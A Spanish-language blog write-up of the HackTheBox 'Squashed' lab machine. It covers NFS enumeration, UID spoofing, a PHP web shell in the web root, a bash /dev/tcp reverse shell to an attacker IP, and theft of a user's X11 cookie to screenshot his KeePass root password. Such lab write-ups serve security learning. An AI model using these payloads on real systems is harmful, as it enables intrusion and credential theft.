---
layout: single
title: Squashed HTB - WriteUp
excerpt: WriteUp de la máquina Squashed de HTB.
date: 2023-03-03
classes: wide
header:
  teaser: /assets/images/Squashed/Squashed.png
  teaser_home_page: true
  icon: /assets/images/Squashed/Squashed.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - NFS                                                                                                                                                                                  
  - Web-Shell                                                                                                                                                                                   
  - Magic-Cookies
  - X11
---

En el día de hoy estaremos resolviendo la máquina Squashed de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.191.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Mounting NFS](#mounting-nfs)
3. [Enumeration of NFS](#enumeration-of-nfs)
4. [Upload Web Shell](#upload-web-shell)
5. [Privesc](#privesc)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
# Nmap 7.91 scan initiated Fri Mar  3 13:20:52 2023 as: nmap -sC -sV -Pn -oN Extraction -p22,80,111,2049,8000,36039,36949,43723,45775 10.10.11.191
Nmap scan report for 10.10.11.191
Host is up (0.10s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Built Better
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      32779/tcp6  mountd
|   100005  1,2,3      36949/tcp   mountd
|   100005  1,2,3      46178/udp6  mountd
|   100005  1,2,3      48565/udp   mountd
|   100021  1,3,4      35457/tcp6  nlockmgr
|   100021  1,3,4      42096/udp   nlockmgr
|   100021  1,3,4      43723/tcp   nlockmgr
|   100021  1,3,4      44619/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8000/tcp  open  http     SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
|_http-title: Directory listing for /
36039/tcp open  mountd   1-3 (RPC #100005)
36949/tcp open  mountd   1-3 (RPC #100005)
43723/tcp open  nlockmgr 1-4 (RPC #100021)
45775/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  3 13:21:04 2023 -- 1 IP address (1 host up) scanned in 11.86 seconds
```

Podemos ver que tiene bastantes puertos abiertos entre ellos varios HTTP y también podemos observar que hay monturas nfs que podríamos montar. Vamos a ver las monturas disponibles.

```bash
❯ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```


### Mounting NFS

Podemos montar esos dos directorios en nuestra máquina local. Vamos a montarlos.

```bash
❯ mount -t nfs 10.10.11.191:/home/ross ross -o nolock
❯ mount -t nfs 10.10.11.191:/var/www/html web -o nolock
```

Lo primero que haré será ver el contenido de /home/ross para ver si hay claves de ssh o algo que me sea de utilidad.

```bash
❯ tree
.
├── Desktop
├── Documents
│   └── Passwords.kdbx
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos
```

Podemos ver que hay un archivo de keepass, no pude romperlo porque no pude extraer el hash del archivo debido a la versión.

```bash
❯ keepass2john Passwords.kdbx > hash
! Passwords.kdbx : File version '40000' is currently not supported!
```

### Enumeration of NFS

Al intentar acceder a la montura de la web no podía acceder. Lo que hice fué crear un nuevo usuario y asignarle el UID necesario para acceder.

```bash
❯ ls -la
drwxr-xr-x root root      50 B  Fri Mar  3 13:26:04 2023  .
drwxr-xr-x root root     342 B  Mon Jan 30 17:52:52 2023  ..
drwxr-xr-x root root       0 B  Sat Feb 18 20:31:08 2023  cdrom
drwxr-xr-x test bly      4.0 KB Thu Mar  2 18:45:06 2023  ross
drwxr-xr-- 2017 www-data 4.0 KB Fri Mar  3 13:30:01 2023  web
drwxr-xr-x root root       0 B  Sat Sep 11 20:01:11 2021  Windows_Mount

❯ usermod -u 2017 test
```

### Upload Web Shell

Una vez dentro me di cuenta que el contenido era el mismo que la web que podía ver por el navegador, por ese motivo intenté subir una revshell en php. Dado que el UID era valido podía escribir en el directorio.

```bash
$cat shell.php 
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```

Si  tratamos de ejecutar algun comando, podemos ver que accedemos al archivo php y es funcional.

```bash
❯ curl -G "http://10.10.11.191/shell.php" --data-urlencode "cmd=id" ; echo
<pre>uid=2017(alex) gid=2017(alex) groups=2017(alex)
</pre>
```

Ahora me intenté establecer una revshell.

```bash
❯ curl -G "http://10.10.11.191/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'" ; echo
```

Si miramos nuestro listener podemos ver que tenemos shell.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
10.10.11.191: inverse host lookup failed: Unknown host
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.191] 33718
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$
```

### Privesc

Ahora haremos el tratamiento de la tty para tener una shell totalmente interactiva. Una vez hecho esto vamos a ver como podemos escalar privilegios. Después de un rato sin encontrar nada decidí mirar los usuarios loggeados.

```bash
alex@squashed:/home/alex$ w
 12:42:12 up 18:57,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               Thu17   18:57m  1:34   0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome
alex@squashed:/home/alex$ 
```

El usuario ross estaba loggeado y yo tenía acceso a su directorio personal a través de una montura.

```bash
❯ ls -la
drwxr-xr-x 1001 bly  4.0 KB Thu Mar  2 18:45:06 2023  .
drwxr-xr-x root root  50 B  Fri Mar  3 13:26:04 2023  ..
drwx------ 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  .cache
drwx------ 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  .config
drwx------ 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  .gnupg
drwx------ 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  .local
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Desktop
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Documents
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Downloads
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Music
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Pictures
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Public
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Templates
drwxr-xr-x 1001 bly  4.0 KB Fri Oct 21 16:57:01 2022  Videos
lrwxrwxrwx root root   9 B  Thu Oct 20 15:24:01 2022  .bash_history ⇒ /dev/null
lrwxrwxrwx root root   9 B  Fri Oct 21 15:07:10 2022  .viminfo ⇒ /dev/null
.rw------- 1001 bly   57 B  Thu Mar  2 18:45:06 2023  .Xauthority
.rw------- 1001 bly  2.4 KB Thu Mar  2 18:45:06 2023  .xsession-errors
.rw------- 1001 bly  2.4 KB Tue Dec 27 16:33:41 2022  .xsession-errors.old
```

Había un archivo .Xauthority que no podía leer, hice lo mismo que antes, cambiarle el UID al usuario test por el 1001.

```bash
❯ usermod -u 2017 test
```

El contenido es una Magic-Cookie-1:

```bash
xxd .Xauthority 
00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
00000020: 4f4f 4b49 452d 3100 10c9 697c d10c e5ad  OOKIE-1...i|....
00000030: f319 9325 0097 7407 5d
```

> El archivo ".Xauthority" es un archivo oculto en el sistema de archivos de Linux que contiene información de autenticación para el servidor de pantalla X. El servidor de pantalla X es el software que controla el hardware de visualización en un sistema Linux y proporciona una interfaz gráfica de usuario para los usuarios. 
> 
> Cuando un usuario inicia sesión en un sistema Linux y ejecuta un programa gráfico, el programa se comunica con el servidor de pantalla X para mostrar su interfaz gráfica en la pantalla. Para garantizar que el programa solo pueda interactuar con su propia ventana y no con otras ventanas en el sistema, el servidor de pantalla X requiere que el usuario se autentique mediante un mecanismo de autenticación. 
> 
> El archivo ".Xauthority" contiene información de autenticación para el servidor de pantalla X, incluido un identificador de cookie de autenticación que se utiliza para verificar que el usuario tiene permiso para acceder al servidor. Este archivo se crea automáticamente cuando se inicia sesión en un sistema Linux y se elimina automáticamente cuando se cierra la sesión del usuario. Si se elimina este archivo por error, es posible que el usuario no pueda iniciar sesión en el servidor de pantalla X o que se produzcan otros problemas de autenticación.


Intenté hacer una caputra de pantalla de lo que estaba haciendo el usuario ross pero no podía debido a que necesitaba su Magic-Cookie (la cual ya tenía)

```bash
alex@squashed:/home/alex$ xwd -display :0 -out captura.xwd
No protocol specified
xwd:  unable to open display ':0'
```

Me descargué el archivo en la máquina victima. Me monte un servidor con python3 en la montura.

```bash
alex@squashed:/tmp$ wget 10.10.16.6:8000/.Xauthority
--2023-03-03 13:02:10--  http://10.10.16.6:8000/.Xauthority
Connecting to 10.10.16.6:8000... connected.
HTTP request sent, awaiting response... 200 OK
```

si añadimos la siguiente variable de entorno apuntando a nuesto archivo, deberiamos poder hacer una captura de pantalla.

```bash
XAUTHORITY=/home/ross/.Xauthority
```

Lo añadimos al env.

```bash
alex@squashed:/tmp$ export XAUTHORITY=/tmp/.Xauthority
alex@squashed:/tmp$ export
declare -x APACHE_LOCK_DIR="/var/lock/apache2"
declare -x APACHE_LOG_DIR="/var/log/apache2"
declare -x APACHE_PID_FILE="/var/run/apache2/apache2.pid"
declare -x APACHE_RUN_DIR="/var/run/apache2"
declare -x APACHE_RUN_GROUP="www-data"
declare -x APACHE_RUN_USER="www-data"
declare -x INVOCATION_ID="b735338f756d4e0c857266067bdebc3b"
declare -x JOURNAL_STREAM="9:27430"
declare -x LANG="C"
declare -x OLDPWD="/home/alex"
declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
declare -x PWD="/tmp"
declare -x SHELL="bash"
declare -x SHLVL="3"
declare -x TERM="xterm"
declare -x XAUTHORITY="/tmp/.Xauthority"
```

Ahora si podemos hacer la captura :)

```bash
alex@squashed:/tmp$ xwd -root -screen -silent -display :0 > screenshot.xwd
alex@squashed:/tmp$ ls
screenshot.xwd
```

Nos la pasamos a nuestro equipo y la abrimos!

```bash
❯ wget 10.10.11.191:8001/screenshot.xwd
--2023-03-03 14:09:12--  http://10.10.11.191:8001/screenshot.xwd
Conectando con 10.10.11.191:8001... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1923179 (1,8M) [image/x-xwindowdump]
Grabando a: «screenshot.xwd»

screenshot.xwd                                  100%[====================================================================================================>]   1,83M  1,20MB/s    en 1,5s    

2023-03-03 14:09:14 (1,20 MB/s) - «screenshot.xwd» guardado [1923179/1923179]
```

Podemos abrirla con gimp o transformarla con ImageMagick. Una vez la abramos podemos ver la contraseña de root en el keepass.

![](/assets/images/Squashed/img1.png)

Si probamos la password podemos ver que es valida y que hemos pwneado la máquina. 

```bash
alex@squashed:/tmp$ su root
Password: 
root@squashed:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@squashed:/tmp#
```

Espero que te haya servido!!

> Las "magic cookies" son cadenas de texto aleatorias que se utilizan en el sistema X Window para autenticar clientes y servidores que se comunican a través de la red. La magia se refiere a que la cadena de texto es secreta y no se puede adivinar fácilmente, lo que la hace difícil de falsificar. 
> 
> En el sistema X Window, cada servidor X tiene una cookie mágica, que es una cadena de texto aleatoria que se genera cuando se inicia el servidor. Cuando un cliente se conecta al servidor X, el cliente envía su propia cookie mágica al servidor para autenticarse. Si la cookie mágica del cliente coincide con la del servidor, entonces el servidor acepta la conexión y permite que el cliente interactúe con él. Si la cookie mágica no coincide, entonces el servidor rechaza la conexión.
> 
> Las magic cookies se almacenan en archivos ocultos en el directorio del usuario, como ".Xauthority", y se utilizan para autenticar conexiones remotas y evitar que se realicen conexiones no autorizadas a los servidores X. Las aplicaciones que utilizan el protocolo X11, como los clientes SSH o los programas gráficos remotos, utilizan las magic cookies para autenticarse y establecer una conexión segura con el servidor X.